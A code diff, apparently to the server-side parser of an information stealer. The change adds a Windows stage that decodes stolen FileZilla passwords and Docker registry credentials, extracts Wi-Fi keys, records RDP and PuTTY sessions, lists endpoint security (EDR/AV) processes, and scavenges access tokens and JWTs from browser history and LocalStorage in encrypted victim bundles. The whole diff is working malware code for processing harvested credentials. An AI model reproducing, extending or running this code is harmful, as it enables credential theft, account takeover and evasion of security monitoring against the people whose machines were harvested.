@@ -617,6 +617,165 @@ def parse_firefox(parts, report, creds):
         report.append("[firefox:%s] logins: %d (%d decrypted)" % (prof, len(entries), good))
 
 
+
+
+# --------------------------------------------------------------------------
+# windows-only stages (keys, vault, wifi, rdp, putty, edr, history, tokens)
+# --------------------------------------------------------------------------
+def filezilla_decode_password(encoded):
+    """FileZilla >=2.5 custom obfuscation (public algorithm):
+    base64( plain[i] XOR (0xff - (i % 16)) )."""
+    import base64 as b64
+    try:
+        raw = b64.b64decode(encoded)
+        return "".join(chr(raw[i] ^ (0xff - (i % 16))) for i in range(len(raw)))
+    except Exception:
+        return None
+
+
+JWT_RE = None
+
+
+def _jwt_re():
+    global JWT_RE
+    if JWT_RE is None:
+        import re
+        JWT_RE = re.compile(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}")
+    return JWT_RE
+
+
+def parse_windows(parts, report, creds):
+    import re
+    from urllib.parse import urlparse
+
+    # ---- win:key/* (plaintext credential files) ----
+    for name, data in parts.items():
+        if not name.startswith("win:key/"):
+            continue
+        short = name[len("win:key/"):]
+        text = data.decode("utf-8", "replace")
+        if "docker-config" in name:
+            # auths -> base64(user:pass)
+            try:
+                j = json.loads(text)
+                for reg, meta in (j.get("auths") or {}).items():
+                    auth = meta.get("auth", "")
+                    if auth:
+                        try:
+                            dec = base64.b64decode(auth).decode("utf-8", "replace")
+                            creds.setdefault("cloud", []).append(
+                                {"name": "docker:%s" % reg, "content": dec})
+                            report.append("[win] docker registry %s -> %s" % (reg, dec))
+                        except Exception:
+                            pass
+                    if meta.get("email"):
+                        creds.setdefault("cloud", []).append(
+                            {"name": "docker:%s" % reg, "content": meta["email"]})
+            except Exception:
+                pass
+            continue
+        creds.setdefault("keyfiles", []).append(
+            {"name": name, "size": len(data), "head": text.strip().splitlines()[0][:60]
+             if text.strip() else "", "private": "PRIVATE KEY" in text})
+        report.append("[win] key file %-42s %8d bytes" % (short, len(data)))
+
+    # ---- win:wifi (netsh output) ----
+    wifi = parts.get("win:wifi")
+    if wifi:
+        text = wifi.decode("utf-8", "replace")
+        ssids = re.findall(r"SSID name\s*:\s*(\S+)", text)
+        keys = re.findall(r"Key Content\s*:\s*(.+)", text)
+        if keys:
+            for k in keys:
+                creds.setdefault("wifi", []).append("windows-wlan: %s" % k.strip())
+            report.append("[win] WLAN: %d profiles, %d with cleartext keys"
+                          % (len(ssids) or len(keys), len(keys)))
+        else:
+            report.append("[win] WLAN: %d profiles (keys need elevation)" % len(ssids))
+
+    # ---- win:rdp-hints / win:putty-sessions ----
+    for pname, key in (("win:rdp-hints", "rdp"), ("win:putty-sessions", "putty")):
+        d = parts.get(pname)
+        if d:
+            lines = [ln.split("\t") for ln in
+                     d.decode("utf-8", "replace").strip().splitlines() if ln.strip()]
+            creds[key] = lines
+            report.append("[win] %s entries: %d" % (key, len(lines)))
+
+    # ---- win:edr ----
+    edr = parts.get("win:edr")
+    if edr:
+        names = [l for l in edr.decode("utf-8", "replace").splitlines() if l.strip()]
+        creds["edr"] = names
+        report.append("[win] EDR/AV processes: %s" % (", ".join(names) if names != ["none detected"] else "none detected"))
+
+    # ---- screenshot ----
+    shot = parts.get("win:screenshot.png")
+    if shot:
+        report.append("[win] screenshot: %d bytes PNG (parts/win_screenshot.png)" % len(shot))
+
+    # ---- DPAPI offline material ----
+    nprotect = sum(1 for n in parts if n.startswith("win:protect/"))
+    nvault = sum(1 for n in parts if n.startswith("win:vault-"))
+    if nprotect:
+        report.append("[win] DPAPI masterkey files: %d (offline decrypt needs user password/hash)" % nprotect)
+        creds["dpapi_masterkeys"] = nprotect
+    if nvault:
+        report.append("[win] Credential Manager vault files: %d (DPAPI; decrypt with masterkeys)" % nvault)
+        creds["vault_files"] = nvault
+
+    # ---- FileZilla sites ----
+    fz = [n for n in parts if n.startswith("win:filezilla/")]
+    for n in fz:
+        text = parts[n].decode("utf-8", "replace")
+        for host, user, enc in re.findall(
+                r"<Host>([^<]+)</Host>.*?<User>([^<]*)</User>.*?"
+                r"<Pass encoding=\"base64\">([^<]+)</Pass>", text, re.S):
+            pw = filezilla_decode_password(enc)
+            creds.setdefault("passwords", []).append(
+                {"url": host, "user": user, "password": pw or enc,
+                 "browser": "filezilla"})
+        hosts = len(re.findall(r"<Server>", text)) or len(re.findall(r"<Site", text))
+        if hosts:
+            report.append("[win] FileZilla sites in %s: %d" % (n.split("/")[-1], hosts))
+
+    # ---- browser History DBs: top domains + token-bearing URLs ----
+    for name, data in parts.items():
+        if not (name.startswith("b:") and name.endswith("/History")):
+            continue
+        try:
+            db = sqlite_bytes_connect(data)
+            hosts = {}
+            for (u,) in db.execute("SELECT url FROM urls LIMIT 20000"):
+                h = urlparse(u).hostname or ""
+                hosts[h] = hosts.get(h, 0) + 1
+                for m in re.findall(r"(?:access_token|token|jwt)=([A-Za-z0-9_.\-]{20,})", u):
+                    creds.setdefault("tokens", []).append({"host": h, "token": m[:64]})
+            db.close()
+            top = sorted(hosts.items(), key=lambda kv: -kv[1])[:15]
+            report.append("[win] history %s: %d urls, top: %s" % (
+                name.split("/")[1], sum(hosts.values()),
+                ", ".join("%s(%d)" % kv for kv in top[:6])))
+            creds.setdefault("history_top", []).extend(
+                {"browser": name.split("/")[1], "domains": top})
+        except Exception as e:
+            report.append("[win] history %s unreadable: %s" % (name, e))
+
+    # ---- LocalStorage leveldb: scavenge JWTs / bearer tokens ----
+    ntok = 0
+    for name, data in parts.items():
+        if "/LocalStorage/" not in name:
+            continue
+        for m in _jwt_re().findall(data):
+            try:
+                tok = m.decode()
+            except Exception:
+                continue
+            creds.setdefault("tokens", []).append({"host": "localStorage", "token": tok[:128]})
+            ntok += 1
+    if ntok:
+        report.append("[win] localStorage: %d JWT/bearer tokens scavenged" % ntok)
+
 # --------------------------------------------------------------------------
 # Linux artifacts
 # --------------------------------------------------------------------------
@@ -831,6 +990,9 @@ def parse_bundle(bundle_dir, psk, redact=False):
     report.append("=== linux artifacts ===")
     parse_linux(parts, report, creds)
 
+    report.append("=== windows artifacts ===")
+    parse_windows(parts, report, creds)
+
     report.append("=== browsers (firefox) ===")
     if HAVE_CRYPTO:
         parse_firefox(parts, report, creds)
@@ -893,8 +1055,14 @@ def main():
 
     if args.bundle:
         dest = os.path.splitext(args.bundle)[0] + "_parsed"
-        os.makedirs(dest, exist_ok=True)
+        os.makedirs(os.path.join(dest, "parts"), exist_ok=True)
         shutil.copy(args.bundle, os.path.join(dest, "bundle.bin"))
+        manifest, xparts = shcrypto.unpack(open(args.bundle, "rb").read(), psk)
+        import re as _re
+        for pname, pdata in xparts.items():
+            safe = _re.sub(r"[^A-Za-z0-9_.()-]", "_", pname)
+            with open(os.path.join(dest, "parts", safe), "wb") as f:
+                f.write(pdata)
         report, rp = parse_bundle(dest, psk, redact=args.redact)
     else:
         target = args.target
